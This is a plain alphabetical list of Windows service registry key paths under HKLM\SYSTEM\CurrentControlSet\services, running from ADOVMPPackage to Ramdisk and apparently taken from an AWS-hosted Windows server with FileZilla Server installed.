HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ADOVMPPackage
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ADP80XX
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\adsi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AFD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\afunix
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ahcache
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AJRouter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ALG
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AmdK8
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AmdPPM
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\amdsata
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\amdsbs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\amdxata
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AppID
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AppIDSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Appinfo
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\applockerfltr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AppMgmt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AppReadiness
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AppVClient
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AppvStrm
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AppvVemgr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AppvVfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AppXSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\arcsas
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AsyncMac
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\atapi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AudioEndpointBuilder
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Audiosrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AWSLiteAgent
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AWSNVMe
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AxInstSV
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\b06bdrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\bam
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\BasicDisplay
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\BasicRender
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\BattC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Beep
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\bfadfcoei
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\bfadi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\BFE
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\bindflt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\BITS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\bowser
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\BrokerInfrastructure
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\BthEnum
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\BthLEEnum
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\BthMini
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\BTHPORT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\bthserv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\BTHUSB
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\bttflt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\buttonconverter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\bxfcoe
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\bxois
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\camsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CaptureService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CaptureService_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\cbdhsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\cbdhsvc_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\cdfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CDPSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CDPUserSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CDPUserSvc_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\cdrom
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CertPropSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\cht4iscsi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\cht4vbd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CimFS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CldFlt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CLFS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ClipSVC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\clr_optimization_v4.0.30319_32
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\clr_optimization_v4.0.30319_64
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CmBatt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CNG
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\cnghwassist
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CompositeBus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\COMSysApp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\condrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ConsentUxUserSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ConsentUxUserSvc_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CoreMessagingRegistrar
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CoreUI
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CredentialEnrollmentManagerUserSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CredentialEnrollmentManagerUserSvc_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\crypt32
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CryptSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CSC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\CscService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\dam
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DCLocator
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DcomLaunch
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\dcsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\defragsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DeviceAssociationBrokerSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DeviceAssociationBrokerSvc_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DeviceAssociationService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DeviceInstall
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DevicePickerUserSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DevicePickerUserSvc_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DevicesFlowUserSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DevicesFlowUserSvc_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DevQueryBroker
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Dfsc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Dhcp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\diagnosticshub.standardcollector.service
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DiagTrack
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\disk
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DispBrokerDesktopSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DmEnrollmentSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\dmvsc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\dmwappushservice
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Dnscache
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DoSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\dot3svc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DPS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\drmkaud
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DsmSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DsSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DXGKrnl
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\e1i68x64
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\EapHost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ebdrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ebdrv0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\edgeupdate
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\edgeupdatem
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\EFS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\EhStorClass
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\EhStorTcgDrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\elxfcoe
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\elxstor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\embeddedmode
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ena
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\EntAppSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ErrDev
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ESENT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\EventLog
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\EventSystem
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ExecutionContext
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\exfat
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\fastfat
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\fcvsc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\fdc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\fdPHost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\FDResPub
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\FileCrypt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\FileInfo
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Filetrace
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\filezilla-server
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\flpydisk
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\FltMgr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\FontCache
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\FrameServer
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\FrameServerMonitor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\FsDepends
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Fs_Rec
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\gencounter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\genericusbfn
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\GPIOClx0101
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\gpsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\GraphicsPerfSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\HdAudAddService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\HDAudBus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\HidBatt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\hidinterrupt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\hidserv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\HidUsb
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\HpSAMD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\HTTP
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\hvcrash
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\HvHost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\hvservice
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\HwNClx0101
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\hwpolicy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\hyperkbd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\HyperVideo
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\i8042prt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\iaLPSSi_GPIO
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\iaLPSSi_I2C
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\iaStorAV
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\iaStorAVC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\iaStorV
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ibbus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\IKEEXT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\IndirectKmd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\inetaccs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\InstallService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\intelide
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\intelpep
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\IntelPMT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\intelppm
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\iorate
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\IpFilterDriver
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\iphlpsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\IPMIDRV
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\IPNAT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\IPT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\isapnp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\iScsiPrt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ItSas35i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\kbdclass
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\kbdhid
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\kdnic
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\KeyIso
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\KPSSVC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\KSecDD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\KSecPkg
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\KslD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ksthunk
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\KtmRm
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LanmanServer
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LanmanWorkstation
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ldap
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\lfsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LicenseManager
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\lltdio
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\lltdsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\lmhosts
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LSI_SAS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LSI_SAS2i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LSI_SAS3i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LSM
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\luafv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MapsBroker
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mausbhost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mausbip
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\McpManagementService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MDCoreSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\megasas2i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\megasas35i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\megasr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MicrosoftEdgeElevationService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mlx4_bus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MMCSS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Modem
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\monitor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mouclass
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mouhid
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mountmgr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mpi3drvi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mpsdrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mpssvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mrxsmb
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mrxsmb20
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MsBridge
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MSDTC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MSDTC Bridge 4.0.0.0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Msfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\msgpiowin32
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mshidkmdf
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mshidumdf
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\msisadrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MSiSCSI
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\msiserver
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MSKSSRV
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MsLbfoProvider
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MsLldp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MSPCLOCK
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MSPQM
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MsQuic
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MsQuicPrev
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MsRPC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MsSecCore
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MsSecFlt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MsSecWfp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mssmbios
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MSTEE
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MTConfig
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Mup
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\mvumis
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\napagent
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NcaSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NcbService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ndfltr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NDIS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NdisCap
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NdisImPlatform
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NdisTapi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Ndisuio
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NdisVirtualBus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NdisWan
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ndiswanlegacy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NDKPerf
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NDKPing
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ndproxy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NetAdapterCx
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NetBIOS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NetbiosSmb
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NetBT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Netlogon
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Netman
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\netprofm
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NetSetupSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NetTcpPortSharing
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\netvsc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\netvscvfpp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NgcCtnrSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NgcSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NlaSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Npfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\npsvctrig
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\nsi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\nsiproxy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NTDS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Ntfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Null
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\nvdimm
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\nvraid
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\nvstor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Parport
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\partmgr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PcaSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\pci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\pciide
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\pcmcia
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\pcw
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\pdc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PEAUTH
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\percsas2i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\percsas3i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PerfDisk
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PerfHost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PerfNet
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PerfOS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PerfProc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PimIndexMaintenanceSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PimIndexMaintenanceSvc_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PktMon
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\pla
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PlugPlay
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\pmem
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PNPMEM
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PolicyAgent
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\portcfg
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PortProxy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Power
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PptpMiniport
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PrintNotify
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PrintWorkflowUserSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PrintWorkflowUserSvc_7b259
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PRM
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Processor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ProfSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Psched
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PsShutdownSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\PushToInstall
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\pvscsi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\qebdrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\qefcoe
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\qeois
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ql2300i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ql40xx2i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\qlfcoei
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\QWAVE
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\QWAVEdrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Ramdisk
